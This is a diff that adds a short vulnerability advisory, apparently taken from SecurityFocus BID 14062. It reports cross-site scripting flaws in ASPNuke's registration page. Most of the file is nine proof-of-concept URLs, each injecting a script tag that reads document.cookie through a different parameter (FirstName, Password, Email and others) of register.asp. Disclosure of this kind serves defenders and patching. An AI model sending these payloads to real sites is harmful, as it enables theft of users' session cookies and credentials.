@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/14062/info
+ 
+ASPNuke is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+ 
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/module/account/register/register.asp?FirstName=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?LastName=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?Username=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?Password=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?Address1=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?Address2=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?City=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?ZipCode=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/module/account/register/register.asp?Email=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
